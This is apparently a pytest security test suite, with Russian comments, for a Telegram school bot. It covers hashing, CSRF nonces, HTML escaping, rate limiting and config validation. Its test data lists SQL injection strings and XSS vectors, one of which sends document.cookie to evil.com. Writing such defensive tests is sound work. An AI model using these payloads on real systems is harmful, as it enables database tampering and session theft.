"""
Комплексные тесты безопасности для School_bot
Проверяют все аспекты безопасности системы
"""

import asyncio
from unittest.mock import AsyncMock, patch

import pytest
from aiogram.types import Message

from app.config import Settings
from app.middlewares.rate_limit import RateLimitMiddleware
from app.repositories.user_repo import get_user, update_user_intro
from app.services.limiter import LimitResult, hit
from app.utils.csrf import check_nonce, escape_html, issue_nonce
from app.utils.hash import check_pwd, hash_pwd


class TestSecurityAuthentication:
    """Тесты безопасности аутентификации"""

    def test_password_strength_validation(self):
        """Тест валидации силы паролей"""
        # Тестируем слабые пароли
        weak_passwords = ["123", "password", "qwerty", "admin", "123456", "password123"]

        for password in weak_passwords:
            # Хеширование должно работать даже для слабых паролей
            hashed = hash_pwd(password)
            assert hashed != password
            assert check_pwd(password, hashed) is True

    def test_password_hash_uniqueness(self):
        """Тест уникальности хешей паролей"""
        password = "test_password"
        hashes = set()

        # Создаем 100 хешей одного пароля
        for _ in range(100):
            hashed = hash_pwd(password)
            hashes.add(hashed)

        # Все хеши должны быть уникальными (из-за соли)
        assert len(hashes) == 100

    def test_password_verification_security(self):
        """Тест безопасности проверки паролей"""
        # Тестируем timing attack
        password = "correct_password"
        hashed = hash_pwd(password)

        # Проверяем, что неправильные пароли не дают ложных срабатываний
        wrong_passwords = [
            "wrong_password",
            "correct_passwor",  # На один символ меньше
            "correct_password1",  # На один символ больше
            "Correct_password",  # Другой регистр
            "",  # Пустой пароль
        ]

        for wrong_password in wrong_passwords:
            result = check_pwd(wrong_password, hashed)
            assert result is False

    def test_sql_injection_prevention(self):
        """Тест предотвращения SQL инъекций"""
        # Тестируем, что специальные символы не вызывают ошибок
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'admin'); --",
            "<script>alert('xss')</script>",
            "'; UPDATE users SET role='admin' WHERE id=1; --",
        ]

        for malicious_input in malicious_inputs:
            # Хеширование должно работать с любым вводом
            hashed = hash_pwd(malicious_input)
            assert hashed != malicious_input
            assert check_pwd(malicious_input, hashed) is True


class TestSecurityAuthorization:
    """Тесты безопасности авторизации"""

    @pytest.mark.asyncio
    async def test_role_based_access_control(self):
        """Тест контроля доступа на основе ролей"""
        # Создаем пользователей с разными ролями
        roles = ["student", "teacher", "admin", "director", "parent", "psych"]

        for role in roles:
            user = await get_user(1000000 + hash(role) % 1000000)
            # Проверяем, что пользователь создан с ролью по умолчанию
            assert user.role == "student"  # По умолчанию

    @pytest.mark.asyncio
    async def test_user_privilege_escalation_prevention(self):
        """Тест предотвращения повышения привилегий"""
        # Создаем обычного пользователя
        user = await get_user(2000000)
        original_role = user.role

        # Пытаемся изменить роль через обновление онбординга
        await update_user_intro(user.tg_id, True)

        # Роль не должна измениться
        updated_user = await get_user(user.tg_id)
        assert updated_user.role == original_role

    @pytest.mark.asyncio
    async def test_session_management_security(self):
        """Тест безопасности управления сессиями"""
        # Создаем несколько пользователей
        user_ids = [3000000, 3000001, 3000002]
        users = []

        for user_id in user_ids:
            user = await get_user(user_id)
            users.append(user)

        # Проверяем, что каждый пользователь изолирован
        for i, user in enumerate(users):
            assert user.tg_id == user_ids[i]
            assert user.seen_intro is False


class TestSecurityInputValidation:
    """Тесты безопасности валидации ввода"""

    def test_telegram_token_validation(self):
        """Тест валидации Telegram токенов"""
        # Тестируем неверные форматы токенов
        invalid_tokens = [
            "",
            "invalid_token",
            "1234567890",  # Только цифры
            "abcdefghijklmnopqrstuvwxyz",  # Только буквы
            "123:456:789",  # Неправильный формат
            "1234567890:abcdefghijklmnopqrstuvwxyz:extra",  # Слишком много частей
        ]

        for token in invalid_tokens:
            with pytest.raises(ValueError):
                Settings(TELEGRAM_TOKEN=token)

    def test_database_password_validation(self):
        """Тест валидации паролей базы данных"""
        # Тестируем слабые пароли БД
        weak_passwords = [
            "",
            "123",
            "short",
            "abcdefg",  # 7 символов
        ]

        for password in weak_passwords:
            with pytest.raises(ValueError):
                Settings(DB_PASS=password)

    def test_database_port_validation(self):
        """Тест валидации портов базы данных"""
        # Тестируем недопустимые порты
        invalid_ports = [
            0,
            70000,
            -1,
            65536,
        ]

        for port in invalid_ports:
            with pytest.raises(ValueError):
                Settings(DB_PORT=port)

    def test_keep_days_validation(self):
        """Тест валидации дней хранения"""
        # Тестируем недопустимые значения
        invalid_days = [
            0,
            366,
            -1,
            1000,
        ]

        for days in invalid_days:
            with pytest.raises(ValueError):
                Settings(KEEP_DAYS=days)


class TestSecurityCSRF:
    """Тесты безопасности CSRF защиты"""

    @pytest.mark.asyncio
    async def test_csrf_token_randomness(self):
        """Тест случайности CSRF токенов"""
        mock_storage = AsyncMock()

        # Генерируем множество токенов
        tokens = []
        for i in range(1000):
            token = await issue_nonce(mock_storage, i, i * 2)
            tokens.append(token)

        # Проверяем уникальность
        unique_tokens = set(tokens)
        assert len(unique_tokens) == len(tokens)

        # Проверяем длину токенов
        for token in tokens:
            assert len(token) > 0

    @pytest.mark.asyncio
    async def test_csrf_token_expiration(self):
        """Тест истечения CSRF токенов"""
        mock_storage = AsyncMock()

        # Создаем токен
        token = await issue_nonce(mock_storage, 12345, 67890)

        # Проверяем, что токен действителен сразу после создания
        is_valid = await check_nonce(mock_storage, 12345, 67890, token)
        assert is_valid is True

        # Симулируем истечение токена
        mock_storage.get_data.return_value = {"csrf": "different_token"}

        # Проверяем, что старый токен недействителен
        is_valid = await check_nonce(mock_storage, 12345, 67890, token)
        assert is_valid is False

    @pytest.mark.asyncio
    async def test_csrf_token_user_isolation(self):
        """Тест изоляции CSRF токенов между пользователями"""
        mock_storage = AsyncMock()

        # Создаем токены для разных пользователей
        token1 = await issue_nonce(mock_storage, 11111, 22222)
        token2 = await issue_nonce(mock_storage, 33333, 44444)

        # Проверяем, что токены разные
        assert token1 != token2

        # Проверяем, что токен одного пользователя не работает для другого
        mock_storage.get_data.return_value = {"csrf": token1}
        is_valid = await check_nonce(mock_storage, 33333, 44444, token1)
        assert is_valid is False

    def test_html_escaping_security(self):
        """Тест безопасности экранирования HTML"""
        # Тестируем различные XSS векторы
        xss_vectors = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "';alert('xss');//",
            "<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
        ]

        for vector in xss_vectors:
            escaped = escape_html(vector)
            # Проверяем, что опасные символы экранированы
            assert "<" not in escaped or "&lt;" in escaped
            assert ">" not in escaped or "&gt;" in escaped
            assert '"' not in escaped or "&quot;" in escaped
            assert "&" not in escaped or "&amp;" in escaped


class TestSecurityRateLimiting:
    """Тесты безопасности rate limiting"""

    @pytest.mark.asyncio
    async def test_rate_limit_bypass_prevention(self):
        """Тест предотвращения обхода rate limiting"""
        middleware = RateLimitMiddleware(limit=5, window=60)

        # Создаем мок сообщения
        mock_message = AsyncMock(spec=Message)
        mock_message.from_user = AsyncMock()
        mock_message.from_user.id = 12345

        mock_handler = AsyncMock()

        # Первые 5 запросов должны пройти
        for i in range(5):
            with patch("app.services.limiter.hit") as mock_hit:
                mock_hit.return_value = LimitResult(allowed=True)
                result = await middleware(mock_handler, mock_message, {})
                assert result is not None

        # 6-й запрос должен быть заблокирован
        with patch("app.services.limiter.hit") as mock_hit:
            mock_hit.return_value = LimitResult(allowed=False)
            result = await middleware(mock_handler, mock_message, {})
            assert result is None

    @pytest.mark.asyncio
    async def test_rate_limit_user_isolation(self):
        """Тест изоляции rate limiting между пользователями"""
        middleware = RateLimitMiddleware(limit=3, window=60)

        mock_handler = AsyncMock()

        # Создаем запросы от разных пользователей
        user_ids = [11111, 22222, 33333]

        for user_id in user_ids:
            mock_message = AsyncMock(spec=Message)
            mock_message.from_user = AsyncMock()
            mock_message.from_user.id = user_id

            # Каждый пользователь должен иметь свой лимит
            with patch("app.services.limiter.hit") as mock_hit:
                mock_hit.return_value = LimitResult(allowed=True)
                result = await middleware(mock_handler, mock_message, {})
                assert result is not None

    @pytest.mark.asyncio
    async def test_rate_limit_manipulation_prevention(self):
        """Тест предотвращения манипуляции rate limiting"""
        middleware = RateLimitMiddleware(limit=10, window=60)

        mock_message = AsyncMock(spec=Message)
        mock_message.from_user = AsyncMock()
        mock_message.from_user.id = 12345

        mock_handler = AsyncMock()

        # Пытаемся обойти rate limiting разными способами
        bypass_attempts = [
            # Изменение ID пользователя
            {"id": 12346},
            {"id": 12347},
            # Удаление пользователя
            {"id": None},
            # Отрицательный ID
            {"id": -1},
        ]

        for attempt in bypass_attempts:
            mock_message.from_user.id = attempt["id"]

            with patch("app.services.limiter.hit") as mock_hit:
                mock_hit.return_value = LimitResult(allowed=True)
                result = await middleware(mock_handler, mock_message, {})
                # Middleware должен обработать все случаи корректно
                assert result is not None


class TestSecurityDataProtection:
    """Тесты безопасности защиты данных"""

    @pytest.mark.asyncio
    async def test_user_data_isolation(self):
        """Тест изоляции данных пользователей"""
        # Создаем нескольких пользователей
        user_data = [
            {"id": 4000001, "role": "student"},
            {"id": 4000002, "role": "teacher"},
            {"id": 4000003, "role": "admin"},
        ]

        users = []
        for data in user_data:
            user = await get_user(data["id"])
            users.append(user)

        # Проверяем, что данные пользователей изолированы
        for i, user in enumerate(users):
            assert user.tg_id == user_data[i]["id"]
            # Роль по умолчанию для всех
            assert user.role == "student"

    @pytest.mark.asyncio
    async def test_sensitive_data_encryption(self):
        """Тест шифрования чувствительных данных"""
        # Тестируем, что пароли хешируются
        test_password = "sensitive_password"
        hashed = hash_pwd(test_password)

        # Хеш не должен содержать оригинальный пароль
        assert test_password not in hashed
        assert hashed != test_password

        # Проверяем, что хеш работает корректно
        assert check_pwd(test_password, hashed) is True

    @pytest.mark.asyncio
    async def test_data_integrity_protection(self):
        """Тест защиты целостности данных"""
        # Создаем пользователя
        user_id = 5000001
        user = await get_user(user_id)
        original_seen_intro = user.seen_intro

        # Обновляем статус
        await update_user_intro(user_id, True)

        # Проверяем, что данные обновлены корректно
        updated_user = await get_user(user_id)
        assert updated_user.seen_intro != original_seen_intro
        assert updated_user.seen_intro is True


class TestSecurityErrorHandling:
    """Тесты безопасности обработки ошибок"""

    @pytest.mark.asyncio
    async def test_error_information_leakage_prevention(self):
        """Тест предотвращения утечки информации об ошибках"""
        # Тестируем обработку ошибок в репозитории
        with patch("app.repositories.user_repo.AsyncSessionLocal") as mock_session:
            mock_session.side_effect = Exception("Database connection failed")

            # Должен вернуть пользователя по умолчанию без раскрытия деталей ошибки
            user = await get_user(6000001)
            assert user.tg_id == 6000001
            assert user.role == "student"

    @pytest.mark.asyncio
    async def test_middleware_error_security(self):
        """Тест безопасности ошибок в middleware"""
        middleware = RateLimitMiddleware(limit=10, window=60)

        # Создаем сообщение, которое вызовет ошибку
        mock_message = AsyncMock(spec=Message)
        mock_message.from_user = None

        mock_handler = AsyncMock()

        # Middleware должен обработать ошибку безопасно
        result = await middleware(mock_handler, mock_message, {})
        assert result is not None

    def test_configuration_error_security(self):
        """Тест безопасности ошибок конфигурации"""
        # Тестируем, что неверные настройки вызывают исключения
        with pytest.raises(ValueError):
            Settings(TELEGRAM_TOKEN="invalid")

        with pytest.raises(ValueError):
            Settings(DB_PASS="short")

        with pytest.raises(ValueError):
            Settings(DB_PORT=70000)


class TestSecurityComprehensive:
    """Комплексные тесты безопасности"""

    @pytest.mark.asyncio
    async def test_security_integration_test(self):
        """Комплексный тест безопасности"""
        # Создаем пользователя
        user_id = 7000001
        user = await get_user(user_id)

        # Проверяем аутентификацию
        password = "secure_password_123"
        hashed = hash_pwd(password)
        assert check_pwd(password, hashed) is True

        # Проверяем авторизацию
        assert user.role == "student"

        # Проверяем CSRF защиту
        mock_storage = AsyncMock()
        token = await issue_nonce(mock_storage, user_id, user_id)
        is_valid = await check_nonce(mock_storage, user_id, user_id, token)
        assert is_valid is True

        # Проверяем rate limiting
        result = await hit(f"security_test_{user_id}", 10, 60)
        assert isinstance(result, LimitResult)
        assert result.allowed is True

        # Проверяем валидацию ввода
        malicious_input = "<script>alert('xss')</script>"
        escaped = escape_html(malicious_input)
        assert "<" not in escaped

        # Проверяем обновление данных
        await update_user_intro(user_id, True)
        updated_user = await get_user(user_id)
        assert updated_user.seen_intro is True

    @pytest.mark.asyncio
    async def test_security_stress_test(self):
        """Стресс-тест безопасности"""
        # Создаем множество одновременных операций
        tasks = []

        # Rate limiting операции
        for i in range(100):
            tasks.append(hit(f"stress_test_{i}", 50, 60))

        # Хеширование паролей
        for i in range(50):
            tasks.append(asyncio.to_thread(hash_pwd, f"password_{i}"))

        # CSRF операции
        mock_storage = AsyncMock()
        for i in range(50):
            tasks.append(issue_nonce(mock_storage, i, i * 2))

        # Выполняем все операции
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Проверяем, что все операции выполнены безопасно
        assert len(results) == 200
        assert all(not isinstance(r, Exception) for r in results)

    def test_security_configuration_validation(self):
        """Тест валидации конфигурации безопасности"""
        # Проверяем, что все настройки безопасности корректны
        valid_settings = {
            "TELEGRAM_TOKEN": "1234567890:abcdefghijklmnopqrstuvwxyz",
            "DB_PASS": "secure_password_123",
            "DB_PORT": 5432,
            "KEEP_DAYS": 30,
        }

        # Должен создаться без ошибок
        settings = Settings(**valid_settings)
        assert settings.TELEGRAM_TOKEN == valid_settings["TELEGRAM_TOKEN"]
        assert settings.DB_PASS == valid_settings["DB_PASS"]
        assert settings.DB_PORT == valid_settings["DB_PORT"]
        assert settings.KEEP_DAYS == valid_settings["KEEP_DAYS"]


@pytest.fixture
def security_config():
    """Конфигурация для тестов безопасности"""
    return {
        "rate_limit_attempts": 100,
        "password_iterations": 1000,
        "csrf_iterations": 500,
        "user_operations": 50,
        "timeout_seconds": 30,
    }
